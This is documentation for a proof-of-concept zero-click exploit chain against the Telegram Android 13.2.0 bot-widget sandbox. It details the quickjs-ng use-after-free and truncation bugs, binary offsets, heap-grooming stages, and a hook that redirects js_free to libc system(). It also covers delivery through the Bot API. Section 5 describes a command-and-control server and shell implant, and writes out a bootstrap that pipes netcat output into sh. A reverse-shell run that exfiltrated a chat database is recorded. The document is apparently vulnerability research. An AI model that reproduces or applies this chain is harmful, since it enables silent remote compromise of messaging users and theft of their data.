# Telegram Android 13.2.0 Widget Exploit PoC: Complete Documentation

Date: 2026-11-06. Source tree: `<HOME>/ailocal/Telegram/telegramandroidwidget/`
(read-only for this documentation pass).

**Primary target (release, `org.telegram.messenger` 13.2.0, versionCode 72801)** -
split APK pair from `evidence/release_updated/` (the build used for the
2026-11-05 release C2 runs on the Sony and the Pixel 9):

| Split | Size | sha256 |
|---|---|---|
| `Android_13.2.0_release_base.apk` | 38,132,632 B | `0887da322c8c68c18dd935ab7d9d8abd1b1f5c1ecf498c508904bb11596b1970` |
| `Android_13.2.0_release_arm64.apk` | 12,694,016 B | `796ee7beb87597da7ed5c566950ed6dd16c1fdd4fc871dfd5a904d30bc128986` |

(`arm64.apk` carries `lib/arm64-v8a/libtmessages.49.so`, 27,052,872 B;
`base.apk` is a split-APK base, `com.android.vending.splits.required=true`.)

Historical lab target (beta, kept for the #1865 10/10 measurements):
`Android_Beta_13.2.0_(72789).apk`; `org.telegram.messenger.beta` 13.2.0
(72789), 76,685,176 B, sha256
`23727eb4208488faf50d96ab8b9cd2574b6cb01ee5e33e4de05a1aee1aeee861`.

> **Token redaction**: no real Telegram bot tokens are present in this document.
> Every bot API example uses the `<BOT_TOKEN>` placeholder. The original
> artifacts in the repository were checked before copying; none of the files
> shipped in the repro zip contains a real bot token (the C2 delivery helper
> reads its token from an external file, see §5.3).

---

## 1. Executive summary

Telegram Android beta **13.2.0** introduced *bot widgets*: a message type whose
HTML/JavaScript payload is rendered inside the app by a **litehtml + quickjs-ng**
sandbox (TL layer 233, `inputMediaWidget` / `messageMediaWidget`). The shipped
quickjs-ng snapshot (`7a23d8e`, 2026-10-23) predates several upstream memory-safety
fixes. The research project demonstrated a **sandbox escape to native command
execution** as the Telegram app UID (`untrusted_app`, no root), triggered simply
by the victim opening a chat containing a malicious widget.

**Measured result (headline):**

- **Primary chain; quickjs-ng PR #1827** (`JS_RegExpDelete` stale bytecode):
  fake libregexp bytecode reclaims the freed regexp program, `REOP_set_i32`
  performs an unchecked 8-byte OOB write into a class-64 (`JSArrayBuffer`)
  block, forging `byte_length`/`max_byte_length`; `BigInt64Array` views over the
  victim give ~2 GB arbitrary read/write; the chain resolves `JSRuntime` and
  redirects `rt->mf.js_free` to libc `system`, which executes an attacker command.
  - Sony XQ-BT52 / Android 13 / beta 72799: `VIEWS=8 → CTX → HOOKED → AFTER`,
    proof `uid=10357(u0_a357) context=u:r:untrusted_app:…` (`rce_proof` file),
    app alive. v3 fixed-delta payload and the universal ELF/GNU-hash variant
    both proven on device.
  - Pixel 9 / Android 17 / **release** `org.telegram.messenger`: the final
    bot-delivered loader (`poc/loader_v7_plain_text_cec.html`, 3,056 B zlib-9)
    was sent **directly through the beta Bot API** (`sendWidget`, message 5511)
   ; no DB injection, no root on the Pixel. It ran the C2 bootstrap; the C2
    session `tg-10290-Pixel_9` executed `id` (`uid=10290(u0_a290)`,
    `untrusted_app_34`), proving the full chain on Android 17 with MTE active
    but not covering the exploited heap.
- **Secondary/fallback chain; quickjs-ng #1865** (`var_ref_count` `uint16_t`
  truncation): 65,533 duplicate generator parameters + closure OOB
  `JSVarRef*` write → frame reuse → fake BigInt/indirect-string/Uint8Array →
  arbitrary R/W → `rt->mf.js_free = system`. Device-proven 10/10 on 72789
  (`rce_proof` md5 `e06bf2b4…`), 10/10 v2 on 72799, and a 72879 C2 loader
  (`poc/loader_1865_72879_ok.html`) with a full C2 session (proof message 5504).
- **Post-exploitation**: a local-only C2 (stdlib Python server + POSIX/toybox
  shell implant) that the one-shot `system()` starts; `exec`/`put`/`get`/
  `sleep`/`bye` over JSON-lines on TCP, loopback or trusted LAN only.
- **Delivery**: the widget feature is server-gated (`INPUT_MEDIA_WIDGET_NOT_ALLOWED`
  for non-whitelisted bots/accounts). Local testing patches
  `messages_v2.data` in `cache4.db` (root on the Sony). On 2026-11-05 the
  research bot was whitelisted for the beta endpoint and delivered the payload
  remotely to the Pixel 9.

The exploit is heap-geometry sensitive (Scudo top-gap first-fit depends on live
widget engine state); single runs are not measurements. Lab model 10/10 (5/5 +
5/5 stress), device results per configuration are documented in §6.

---

## 2. Target and attack surface

| | |
|---|---|
| App | **Release target: `org.telegram.messenger` 13.2.0 (72801)**: the 2026-11-05 C2 runs (Sony + Pixel 9) used the release build. Beta: `org.telegram.messenger.beta` 13.2.0 (72789/72799/72879), the historical lab/device target |
| APK | Release: split pair `Android_13.2.0_release_base.apk` + `Android_13.2.0_release_arm64.apk` (hashes above). Beta: `Android_Beta_13.2.0_(72789).apk`. Native lib `libtmessages.49.so` |
| Engine | litehtml + gumbo renderer (`twlite::`), **quickjs-ng** snapshot `[2026-10-08, 2026-10-30)`; app commit `7a23d8e` (2026-10-23) |
| Sandbox limits | 6 MiB JS heap, 8 MiB memory, 500 ms continuous CPU budget / 300 ms quota, max 64 timers, max 1000 scripts, no byte-size limit |
| Capabilities | `eval`/`Function` allowed; ArrayBuffer/typed arrays/BigInt allowed; `fetch`/XHR/WebSocket/Worker are throwing stubs; `__host*` bridge deleted before user code |
| Attack trigger | a widget message rendered in a chat; scripts run at layout, no tap needed |
| Impact | sandbox escape → `system()` as app UID (`untrusted_app`), app private data reachable, LAN network as the app; not root/kernel |

Devices: Sony XQ-BT52 (Android 13, arm64, rooted; only for the lab DB patch
delivery), Pixel 9 (Android 17, no root, bot delivery), armv7 emulator
(Android 7.1, partial port only).

---

## 3. Vulnerability and exploit chain

### 3.1 The bug family (quickjs-ng snapshot window)

The shipped engine is a quickjs-ng master snapshot from 2026-10-08..10-30
(240-entry atom table like v0.18.0; PR #1844 absent). Fixes merged after the
snapshot are absent. The PoC family covers:

| Bug | Upstream | Class | Status in this project |
|---|---|---|---|
| `JS_RegExpDelete` stale bytecode | **PR #1827** (opened 2026-10-15) | UAF → arbitrary R/W | **primary device RCE** (class-64 chain, v3 + universal) |
| `var_ref_count` truncation | **#1865** (filed 2026-11-01 by this project) | OOB R/W | **secondary device RCE** (10/10 72789; v2 10/10 72799; 72879 C2 loader) |
| `js_array_find` double free | #1792 | arena metadata write | DoS / teardown crash only (no post-interrupt JS) |
| WeakMap symbol-value UAF | #1835 | null deref | device DoS confirmed (`tombstone_13`); 47-shape study: no RCE variant |
| Array.find ownership UAF | #1826 | UAF | open/unfixed, not weaponized |
| `unicode_script()` fail-loop | #1828 (fix PR #1829) | double free / spin | OOM-gated DoS (W-13) |
| parser OOM `scopes[-1]` (N1) | novel (unreported) | fixed-offset OOB write | DoS/allocator-only, not RCE |
| closure-resolution OOM (N2) | novel | fixed +0x7fff8 primitive | DoS + forced-build OOB, no leak, no RCE |
| FinalizationRegistry `unregister` UAF | novel | stale list_del | DoS; needs a 96-byte reclaim to escalate |

### 3.2 #1827: `JS_RegExpDelete` stale bytecode (primary)

**Root cause.** `JS_RegExpDelete` (empty replacement + global regexp + builtin
`exec`) snapshots `re->bytecode` *before* coercing `lastIndex`. The planted
`lastIndex` object's `valueOf()` calls `re.compile()`, which frees the bytecode;
the delete path then allocates the capture array and runs `lre_exec()` on the
freed program. In the app binary: `JS_RegExpDelete` at 0x17651cc reads
`re->bytecode` at 0x1765258, then `JS_GetProperty(lastIndex)` at 0x17652f0,
then uses the stale pointer at 0x17653b8 and calls `lre_exec` (0x17a9ce4).
`REOP_set_i32` (0x17aa7e8) has no bounds check.

**Trigger.** `"a".replace(re, "")` with a getter on `re.exec` that plants
`LI` (a `valueOf` that calls `re.compile("x","g")` and performs the groom).
One synchronous `replace()`, ~1.5 ms, ~114 KB, no GC stress, no CPU interrupt.

**Primitive.** `REOP_set_i32` computes `idx = 2*capture_count + pc[0]`
unchecked → an 8-byte OOB read+write at a chosen offset past the capture
array with a chosen 32-bit value. The capture array is moved to the
**class-64** arena (the `JSArrayBuffer` struct slab): a fake program of
`set_i32` writes forges the victim `ArrayBuffer`'s `byte_length` /
`max_byte_length`.

**Stages (class-64 v3 / universal v7 chain, the shipped chain):**

1. **Groom.** `FILL64` 16-byte `ArrayBuffer`s (class-64 slab fill) +
   `FILL80` 47-char strings; a 454/480-byte `Uint8Array` reclaims the freed
   regexp bytecode (class 480) and carries the fake libregexp program.
   `LI.valueOf` triggers `re.compile` (frees the old bytecode), then allocates
   the reclaim and `NV` victim `ArrayBuffer(72)`s.
2. **Fake-bytecode execution.** The `replace()` runs the forged program;
   `set_i32` writes the magic byte-length constant into a victim's
   `byte_length`/`max_byte_length` fields.
3. **Scan.** Each victim is wrapped as `Uint8Array`/`BigInt64Array`/
   `BigUint64Array`; the forged one yields views of length > 1 MiB (up to
   ~2 GB). A MAGIC nonce write-through-read distinguishes the real victim
   from stale views (fixed nonce + random MAGIC in the final loader).
4. **Arbitrary R/W.** `setR(T)`/`RD(A)`/`wr64(A,val)` give 64-bit read/write
   at arbitrary addresses (in-view fast path for the victim's own buffer,
   pointer round-trip for everything else).
5. **Context/runtime discovery.** v3 walks the found view's JSObject
   (`shape+48 → proto+32 → prop[1] → constructor+48 → realm = ctx`);
   v6/v7 add an arena-derived `JSRuntime` selection with a prototype-chain
   fallback and `ctx → rt = *(ctx+16)`.
6. **Endgame.** `js_free = *(rt+16)` is the app's `js_def_free` stub; v7
   decodes the stub's `MOV X0,X1; B <plt>` + the PLT `ADRP/LDR` to resolve
   libc `free` from the GOT **at runtime** (no build constants), then walks
   the libc ELF (`PT_DYNAMIC` → `DT_STRTAB`/`DT_SYMTAB` → SysV/GNU hash) to
   resolve `system`. `rt+64 = command string`, `rt+16 = system`, free a fresh
   4 KiB `TRIG` → `js_free_rt` calls `system(opaque=command)`.
7. **Proof.** `system("id > …/rce_proof")` or the C2 bootstrap string.

The v3 device markers: `VIEWS=8 → CTX → HOOKED → AFTER`, proof
`uid=10357(u0_a357) context=untrusted_app` (app alive). The universal variant
resolves libc dynamically (`free=… → elfbase=… → system=…`), no `SYSTEM_DELTA`.
The final bot-delivered artifact is `poc/loader_v7_plain_text_cec.html`
(3,056 B zlib-9, 1,040 B margin under the 4,096 B bot limit; ctxErr-as-numbers
+ direct-ctor reductions; proofs 5489/5492/5493 on 72879; Pixel bot delivery
message 5511).

### 3.3 #1865: `var_ref_count` truncation (secondary / fallback)

`JSFunctionBytecode.var_ref_count` is `uint16_t`; the compiler counts captures
in an `int`. A sloppy-mode generator with 65,533 duplicate `x` parameters plus
`y` and a parse-time direct `eval` (`if (0) eval('')`) makes every argument
captured (65,539 captures → truncates to 3). The frame allocates 3
`JSVarRef*` entries; `get_var_ref()` indexes `sf->var_refs[65533]`, ~524 KB past
the 1 MB frame, into the next allocation.

Chain: two 1 MB `ArrayBuffer` grooms (`b0a`/`b0b`; later A/T cache groom) catch
the OOB `JSVarRef*` write → leak a real `JSVarRef` → complete the generator so
the frame is reused by a `buf2` ArrayBuffer → fake BigInt over the leaked frame
leaks `V->pvalue` (frame address `F`) → fake indirect `JSString` at `F+0x100`
(arbitrary byte read) + fake `Uint8Array` at `F+0x1000` (arbitrary byte write)
→ engine walk (`sf+8 → cur_func → +0x30 → bytecode → +0x48 → ctx → +16 → rt`)
→ resolve `js_def_free` → PLT → GOT → libc `system` → hook `rt->mf.js_free`.

Device: 72789 **10/10** (fresh proof each run, `S1 off=511928`, no crash);
72799 v2 **10/10**, v4 **9/10** (one BigInt-path crash, `tombstone_20`); the
universal layer 11/11 on device. Per-build constants only
(`js_def_free`/`free@GOT`), tabulated for 72549…72879 in
`notes/1865_72879_c2.md`. The 72879 C2 loader (`poc/loader_1865_72879_ok.html`,
8,094 B raw / 3,486 B zlib) produced a full C2 session (proof message 5504).
Upstream PR #1869 ("reject >65535 captures") is open; if merged, this fallback
dies.

### 3.4 Why this is the "#1827 family"

The whole bug family lives in the same widget sandbox surface (untrusted
widget HTML → quickjs-ng → app process). #1827 was the top RCE candidate from
the first day, became the device-proven *primary* RCE (class-64 v3 + universal
v7), and the final bot-delivered artifact is the #1827 v7 loader. #1865 is the
independent second chain that was also fully weaponized and is kept as the
ready fallback if the #1827 fix lands first.

---

## 4. Delivery

### 4.1 Bot API (production-like path, proven 2026-11-05)

```
POST https://api.telegram.org/beta/bot<BOT_TOKEN>/sendWidget
Content-Type: application/json
{ "chat_id": <chat id>, "html": "<widget html>" }
```

- At the time of this run, the beta prefix was required (`/beta/bot…`);
  the stable `api.telegram.org/bot…/sendWidget` returned 404.

  > Update 2026-11-08: the standard prefix now serves `sendWidget` natively.
  > The beta requirement was true for the 2026-11-05 run recorded here.
- Optional fields: `reply_markup`, `width`, `height`, `allow_queries`,
  `shared_widget`, `public_data`, `chat_data` (form and JSON both parsed).
- The endpoint is **server-gated**: non-whitelisted bots/accounts receive
  `400 INPUT_MEDIA_WIDGET_NOT_ALLOWED` (the gate is account/bot permission,
  not protocol). MTProto `messages.sendMedia` + `inputMediaWidget#44f6c04e`
  hits the same gate. Reference widgets in the wild were sent by a whitelisted
  **user account** ("OPTIMUS PRIME").
- The whitelisted widget bot enforces **two byte limits** on the HTML file
  (measured through the bot): raw ≤ 32,768 B and
  `zlib.compress(html, 9)` ≤ 4,096 B (`INPUT_MEDIA_WIDGET_TOO_LARGE` above).
- Pixel 9 run: widget message **5511** sent to chat <CHAT_ID> via the bot
  (`sendwidget_test_5511.json`); the HTML round-tripped byte-identical;
  the phone opened the widget, the #1827 v7 loader ran, and the C2 session
  `tg-10290-Pixel_9` came up (§6). No root, no DB patch on that device.

### 4.2 Local DB patch (lab channel, Sony with root)

Patch the `messageMediaWidget` payload of a widget message in
`/data/data/org.telegram.messenger.beta/files/cache4.db`:

```sh
python3 tools/widget_tool.py cache4.db <mid> --html /path/poc.html   # --help for options
adb shell am force-stop org.telegram.messenger.beta
adb push cache4.db /data/data/org.telegram.messenger.beta/files/cache4.db
adb shell rm -f .../cache4.db-wal .../cache4.db-shm
adb shell monkey -p org.telegram.messenger.beta 1   # open the chat with the widget
```

`widget_tool.py` decompresses/recompresses the TL `payload:bytes` and preserves
the message attach-path tail (widget must be the last field of the message).

### 4.3 Loaders (size / obfuscation layer)

- `tools/make_loader.py`; RC4 + base64 + canvas PIN keypad loader
  (`widget_loader_pin.html` template).
- `tools/make_loader_aes.py`; AES-128-CTR + raw deflate + keypad loader
  (needs `cryptography` on the build host).
- `c2/tools/make_loader_4096.py`; rebuilds the device-proven LZSS/AES 4 KiB
  loader from a patched payload.
- Final bot loaders are **plaintext** (`poc/loader_v7_plain_text_*.html`):
  the keypad had no security value with autoplay and a hardcoded PIN, and the
  plaintext v7 payload fits the 4,096 B zlib limit with a 1,040 B margin.

### 4.4 Minimal single-file PoC (`minimal_poc/`)

`minimal_poc/poc.html` is the **exact** HTML that ran on both targets; byte
identical to the bot-delivered Pixel message 5511 (sha256
`22c96d824e814f1b7de82b412ed6ad5def3c394631b7aeeb5f6a91cb646dc902`, 7,460 B
raw / 3,056 B zlib), to the widget stored in the release-72801 Sony DB
(`cache4.release72801.widget.db`, mid 3038544, `cmp` identical), and one of the
Sony 72879 v7 proofs (5489/5492/5493). It is the smallest reliable #1827 chain
and the only artifact proven on the Sony release, the Sony beta and the Pixel.
`minimal_poc/README.md` explains every block of the HTML (CFG, trigger,
reclaim, victims, arbitrary R/W, ctx/rt discovery, PLT/GOT + ELF resolver,
`system()` hook); `minimal_poc/send_poc.py` is a stdlib-only
`/beta/bot<BOT_TOKEN>/sendWidget` sender with `--dry-run` and `--host/--port`
CMD rewriting. Only `CFG.CMD` normally needs editing (the shipped value points
at the lab `<LAN_IP>:4445`).

---

## 5. C2 architecture and usage

Post-exploitation command-and-control in `c2/`; a stdlib-Python server plus a
POSIX sh/toybox implant. It runs as the app UID (no root), binds only to
loopback or a trusted LAN (`<LAN_IP>` in the tests), and makes **no
outbound connections** (implants dial in; the loader port only answers).

```
c2/
├── server/c2_server.py   TCP control+loader server, sessions, CLI, batch (--cmd/--script)
├── server/c2common.py    bootstrap renderer, local-only bind/peer checks, token check
├── implant/implant.sh    shell implant (protocol loop, FIFO+nc transport)
├── implant/supervisor.sh watchdog (restarts implant, watches app PID, locks)
├── mock/mock_implant.sh  host-only implant for tests (refuses to run on device)
├── tools/make_bootstrap.py     print the exact system() bootstrap command
├── tools/patch_payload.py      swap the endgame command in an exploit payload
├── tools/make_loader_4096.py   rebuild the bot-size LZSS/AES loader
├── tools/make_loader_pinok.py / make_loader_keypad_*.py   keypad loader variants
├── run_local_test.sh     host end-to-end test (74 checks)
└── README.md
```

### 5.1 Bootstrap (the one-shot entry)

The exploit's `system()` command is ~80 chars:

```sh
setsid sh -c '/system/bin/sleep 2|/system/bin/toybox nc <HOST> <LOADER_PORT>|sh' &
```

- `setsid … &`; new session; `system()` returns immediately and the pipeline
  survives an app crash (same mechanism as the reverse-shell PoC);
- `sleep 2` holds `toybox nc`'s stdin open (toybox `nc` exits on stdin EOF);
- `| sh` runs the ~39 KB bootstrap the loader port serves (rendered by
  `c2common.render_bootstrap` with host/port/token/build placeholders).

Generate it: `python3 c2/tools/make_bootstrap.py --host <LAN_IP> \
--port 4445 --token <C2_TOKEN>` (the server also has `--print-bootstrap`).

### 5.2 Server

```sh
python3 c2/server/c2_server.py                        # loopback, control 4444, loader 5555
python3 c2/server/c2_server.py --host <LAN_IP> --allow-lan \
    --port 4444 --loader-port 4445 --token <C2_TOKEN>
```

CLI: `sessions`, `use <sid>`, `info`, `ping`, `exec <cmd>` (or bare `<cmd>`,
auto-shell), `put <local> <remote>`, `get <remote> [local]` (into
`downloads/`, sha256-verified), `sleep`, `reconnect`, `bye [stop]`,
`broadcast exec`, `wait`. Batch mode: `--cmd "…"` (repeatable) or
`--script ops.txt`. `--bootstrap-diag`/`--diag-xtrace` serve the one-shot
transport diagnostic instead of the full implant.

Protocol: JSON-lines; commands/paths are base64 so shell metacharacters cannot
break the framing; `exec` streams `out`/`err` chunks live and reports real
`rc`; `put`/`get` are chunked with sha256; server pings every 30 s, implant
drops/reconnects after `C2_RX_TIMEOUT` (75 s default).

### 5.3 Implant

Installed by the bootstrap under
`/data/user/0/org.telegram.messenger.beta/files/.c2/` (release:
`…/org.telegram.messenger/files/.c2/`): `implant.sh` (protocol loop),
`supervisor.sh` (watchdog), pid/lock files, `build` sentinel, heartbeat,
logs, and the `C2_DIAG=1` artifacts (`diag.out`/`diag.trace`). Transport:
two pre-opened FIFOs (`exec 8<>IN; exec 9<>OUT`) + `toybox nc <OUT >IN &` +
`cat IN >> CMDQ &`; both O_RDWR pre-opens are load-bearing on mksh (a
single-reader FIFO open blocks before `cat` starts; the 02:12 device diag
proved this). Uses only Android-13 toybox applets (no `read -t`/`mktemp`/
`flock`/`jq`/`nohup`).

Re-arm storm control: the bootstrap takes `boot.lock`, answers
`C2_BOOTSTRAP_BUSY`/`C2_ALREADY_RUNNING` on repeat fetches (a chat scroll
produced ~30 fetches), upgrades on build change, and sweeps `/proc` for stale
implants. The supervisor restarts a dead implant (backoff 1→30 s) and re-hellos
after an app PID change.

### 5.4 Honest persistence limits (measured)

- Survives an app **crash** (`setsid` + supervisor restart).
- Does **not** survive `am force-stop` / app kill: Android kills the whole UID
  cgroup (measured with `kill -9` and `force-stop`; no non-root workaround).
- Nothing survives a reboot (no init/`wrap.*` hook); re-run the widget RCE.
- App UID only; LAN only; loader port has no TCP auth (token is inside the
  served script); trusted LAN only. Cached-app freezer can pause the C2 when
  Telegram is backgrounded (platform limit).

### 5.5 Token handling in this project

`poc/c2_pinok_deliver.py` obtains its bot token at runtime from
`<HOME>/ailocal/Telegram/POC/mtproto_entity_probe/probe_mtproto.py`
(not part of this zip); the archive contains no token. The C2 `--token`
values (e.g. `NIGHT4`) are local shared secrets for the LAN test, not bot
credentials.

---

## 6. Measured results

### 6.1 #1827 (primary chain)

- Lab (app model, 6 MiB / 300 ms): full chain 10/10 (5/5 + 5/5
  simulated-fragmentation stress); peak heap ~414 KB, trigger ~27 ms.
- Sony 72799, v3 (fixed delta): `VIEWS=8 → CTX → HOOKED → AFTER`; proof
  `uid=10357(u0_a357) … untrusted_app`; app alive. Evidence
  `evidence/evidence_20261101/regexp1827_class64_device/`.
- Sony 72799, universal (ELF/GNU-hash resolver, no delta): proof
  `uid=10357`; `FILL64=4000/8000` runs OK, `FILL64=2000` failed (validator
  context selected; real universal-adaptation failure documented).
- Stability measurement (5 consecutive cold starts of `FILL64=8000`): **0/5**
  proofs with app alive; the device exploit is heap/geometry sensitive; the
  statistically meaningful stability number is the lab 10/10.
- Pixel 9 / Android 17 (debuggable second package, no root): v3 with
  `SYSTEM_DELTA=0x41fe0` proof `uid=10178(u0_a178) … untrusted_app_34`; two
  more runs with MTE **on** (`persist.arm64.memtag.app.<pkg> on`): proof
  recreated, no crash; the chain touches non-PROT_MTE memory (quickjs 64 KiB
  arena, scudo:primary, text segments).
- **Pixel 9 release + Bot API (2026-11-05, final):** `loader_v7_plain_text_cec.html`
  (3,056 B zlib) delivered by the bot as message 5511; bootstrap served
  39,346 B on 4445; C2 session `tg-10290-Pixel_9` `uid=10290(u0_a290)`,
  Android 17, `untrusted_app_34`; proof exec
  `id; getprop …` → `[exec rc=0 1.59s]`; proof messages 5512/5513
  (`evidence/c2_pixel_android17_proof.log`).
- **Sony release C2 (2026-11-05 18:06):** the same release 13.2.0 (72801) on
  the XQ-BT52; session `tg-10372-XQ-BT52-release`, `uid=10372(u0_a372)`,
  release app data dir `/data/user/0/org.telegram.messenger/files/.c2`;
  `exec id; ls …` → `[exec rc=0 1.10s]`
  (`evidence/c2_release_72801_proof.log`, build `51f2ec292c357cfc`,
  `evidence/release_72801_bootstrap.sh`). The widget in the archived DB
  (`cache4.release72801.widget.db`, mid 3038544) is byte-identical to
  `minimal_poc/poc.html` (7,460 B, sha256 `22c96d82…`, same `CFG.CMD`).
- v7 device verification on 72879 (Sony, DB patch): C2 proof 5457; and the
  plaintext size-reduction campaign on 72879 with proofs 5463-5494 (see
  `notes/v7_plain_text_batch.md` for the full size/result table).

### 6.2 #1865 (secondary chain)

- 72789: 10/10 cold-start, `S0→S6`, fresh 186-byte proof
  (`uid=10357(u0_a357) … untrusted_app`), md5 `e06bf2b4c01be9db54f49a9776dcf5ee`,
  no crashes.
- 72799: v2 10/10 proofs; v3 3/3 chain but 0/3 proof (dynamic
  `/proc/$PPID/cmdline` command defect); v4 9/10 proofs + 1 BigInt-path crash
  (`tombstone_20`).
- Universal layer: 11/11 on device (two-direction groom, padding prime
  `len=0x41`, runtime ELF `system`); lab 5/5 in 39-bit/47-bit/bottom-up models.
- Reverse shell: `widget_poc_1865_revshell.html` → `setsid` FIFO/netcat shell;
  host received an app-UID shell and exfiltrated `cache4.db` (4,575,232 B,
  647 messages) **after the app process had crashed**: no root, no `adb pull`.
- 72879 C2 loader: full session, proof 5504, app alive.

### 6.3 Other measured results

- #1792 `find` double free: deterministic SIGABRT at teardown 3/3 (release),
  controlled 2+2-byte arena write; device = latent (no post-interrupt JS).
- #1835 WeakMap UAF: device crash at `js_map_finalizer+0xe4` (tombstone_13);
  no survival variant (47 shapes, 0 double frees).
- MTE: not validated (QEMU user-mode MTE unreliable; retracted earlier
  "blocked" claims); on the Pixel the exploit runs with MTE on because it
  never dereferences PROT_MTE memory.
- Fuzzing: ~2.7 M execs ASan+UBSan on the app snapshot; no new memory bug.

---

## 7. Artifacts inventory

### 7.1 Reports (repo root of `telegramandroidwidget/`)

| File | What it is |
|---|---|
| `README.md` | Research archive index + status (all bug lines, W-9…W-13) |
| `REPORT.md` | Detailed report: TL layer, engine, JS API audit, W-1…W-13 addenda, device RCE addendum, reverse shell |
| `REPORT_COMPLETE.md` | Consolidated report: vuln #1865, exploit chain, device RCE, universality, delivery, fix, timeline |
| `REPORT_20261102.md` | Consolidated overnight report: #1827 class-64 device RCE, universal resolver, C2, persistence, armv7, new-bug hunt |
| `FINDINGS.md` | Finding-by-finding ledger (CONFIRMED/LIKELY/OPEN) for every claim |

### 7.2 PoC payloads and agents (`poc/`)

| File | What it is |
|---|---|
| `agent_*.js` (14 files, ~715 KB each) | Frida agent bundles (bundled `frida-shim` + agent sources: `agent_poc.js`, `agent_poc_iife.js`, `agent_poc_split.js`, `agent_poc_str.js`, `agent_poc_teardown.js`, `agent_benign.js`, `agent_diag*.js`, `agent_inject_str.js`, `agent_marker.js`, `agent_native.bundle.js`, plus `probe*.bundle.js`, `clear_*.bundle.js`); used with the frida_* scripts for in-engine instrumentation |
| `loader_v7_plain_text_cec.html` | **Final bot-delivered #1827 loader** (3,056 B zlib; proofs 5489/5492/5493; Pixel message 5511) |
| `loader_v7_plain_text_{comb,univ,batch,ctxonly,ctxonly_gnu,minwrap,strip,fixmag,4k,nokeypad}.html` | The v7 plaintext size-reduction series |
| `loader_v7_video_4455.html`, `loader_v7_plain_text.html` | earlier v7 loaders |
| `loader_1865_72879_ok.html` | #1865 fallback C2 loader for 72879 (3,486 B zlib) |
| `loader_1865_72879_{c2abs,c2sync,debug,diag,nctest,ok}.html` | 72879 loader variants |
| `widget_poc_1865_{leak,rce,universal}.html` | #1865 leak / RCE / universal payloads |
| `payload_c2.js`, `c2_overlay.txt`, `c2_pinok_deliver.py` | C2 endgame payload + delivery helper |
| `send_widget.py` | MTProto `inputMediaWidget` sender (bot or user account; `--dry-run` prints bytes) |
| `device_test.sh`, `verify.sh`, `poc_verify.c`, `quickjs_find_uaf_repro.c`, `widget_find_uaf.js`, `asan_*.log` | #1792 find-UAF engine PoC (ASan repro + widget trigger) |
| `make_widget_payload.py`, `probe_variants.py`, `widget_poc_*.{gz,zlib}` | payload packers / compressed variants |
| `frida_direct_*.js`, `run_frida*.py`, `probe_frida.js`, `make_frida_script.py` | Frida instrumentation for the widget sandbox |
| `validate_v2.js` | loader roundtrip validator |
| `input_media_widget.bin` | serialized `inputMediaWidget` TL bytes (dry-run) |
| `keypad_screen.png`, `pin_*.png`, `v2_screen.png` | device screenshots (not shipped; see §7.6) |
| `bot_*.session` (3×28 KB) | telethon session databases; **excluded from the zip** |

### 7.3 C2 (`c2/`)

| File | What it is |
|---|---|
| `README.md` | full C2 manual (protocol, deployment §5, troubleshooting) |
| `server/c2_server.py`, `server/c2common.py` | server + bootstrap renderer |
| `implant/implant.sh`, `implant/supervisor.sh` | shell implant + watchdog |
| `mock/mock_implant.sh` | host-only mock implant |
| `tools/make_bootstrap.py`, `tools/patch_payload.py`, `tools/make_loader_4096.py`, `tools/make_loader_pinok.py`, `tools/make_loader_keypad_{v2,rc4,chacha}.py` | build/deploy tools |
| `run_local_test.sh` | 74-check host end-to-end test |
| `logs/`, `downloads/`, `__pycache__/` | **excluded from the zip** (logs/downloads per instructions) |

### 7.4 Tools (`tools/`)

| File | What it is |
|---|---|
| `widget_tool.py` | `cache4.db` `messageMediaWidget` payload patch (extract/patch/replace, zlib) |
| `make_loader.py` / `make_loader_aes.py` | RC4 / AES-128-CTR keypad loaders |
| `rev_listener.py` | host listener for the reverse-shell PoC |

### 7.5 Key lab payloads shipped as `payloads/` (cherry-picked from `lab/`, the 11 GB dir is not shipped)

| File | What it is |
|---|---|
| `1865/widget_poc_1865_{rce,universal,universal_v2,v3,v4,revshell,leak2..4,eval}.html` | #1865 chain artifacts (incl. v4 = most feature-complete) |
| `1865/widget_loader_pin.html`, `widget_loader_aes*.html` | loader templates |
| `1827/device_payload_v3_72799{,_f8000,_pixel_fixed,_dbg}.js` | #1827 class-64 v3 device payloads |
| `1827/device_payload_v3_universal{,_dbg}.js`, `device_payload_1827_class64{,_f2000,_f8000}.js` | universal resolver variants |
| `1827/device_payload_v7_*.js`, `device_payload_v7lite.js` | v7 runtime-PLT/GOT payloads (no build constants) |
| `1827/gen_*.py`, `lab_*.js`, `v6_template.js`, `run_v6_evidence.sh` | payload generators + lab variants |
| `qjs_bughunt/poc1827_*.js`, `RESULTS.md`, `DEVICE_TEST.md` | #1827 lab primitive ladder PoCs |
| `lab/qjs_postsnapshot/loaders/size_variants/` (payloads/, out/, build scripts, validate.js, README.md, SAFE_REBUILD.md) | 4 KiB bot loader construction kit (kept at the `lab/` path that `c2/tools/make_loader_4096.py` and `tools/make_loader*.py` expect, so the shipped builders run unmodified) |
| `loaders/widget_loader_4kb*.html` | 4 KiB AES/LZSS loaders (Sony/Pixel AT variants, C2 variant) |

### 7.6 Evidence shipped in the zip (small files only)

| File | What it proves |
|---|---|
| `evidence/c2_pixel_android17_proof.log` | Pixel 9 / Android 17 **bot-delivered** #1827 → C2 session `tg-10290-Pixel_9`, `exec rc=0` (18:31-18:32, 2026-11-05) |
| `evidence/c2_release_72801_proof.log` | **release 13.2.0 (72801)** C2 on the Sony: session `tg-10372-XQ-BT52-release`, `uid=10372(u0_a372)`, `org.telegram.messenger` data dir, `exec rc=0` (18:06, 2026-11-05) |
| `evidence/release_72801_bootstrap.sh` | the exact release bootstrap served by the loader port (build `51f2ec292c357cfc`) |
| `evidence/sendwidget_test_5511.json` | the Bot API `sendWidget` response for message 5511 (contains the exact delivered loader HTML) |
| `evidence/evidence_20261102/c2_newrce/{c2_session_new_rce.log,c2_reconnect_rootprobe.log,device_payload_c2.js,device_payload_c2.html}` | #1827-v3 C2 session + automatic reconnect after server restart |
| `evidence/evidence_20261102/regexp1827_class64_universal/{rce_proof_uid10357_universal.txt,device_payload_universal{,_f8000}.js,device_payload_universal{,_f8000}.html}` | universal ELF-resolver proof (uid 10357) + payloads |
| `evidence/evidence_20261102/pixel_mte/{rce_proof.txt,rce_date.txt,mte_mapping_analysis.txt,pixel_payload.{js,html},pixel_payload_raw.html}` | Pixel MTE-run proof (uid 10178) + payloads |
| `evidence/sendwidget_test_5511.json` | bot delivery record (above) |

**Excluded from the zip (noted here):** `c2/logs/` (110 session dirs), `c2/downloads/`,
`evidence/db_*/*.db` and `tw_*.db` (5 MB sqlite snapshots), screenshots
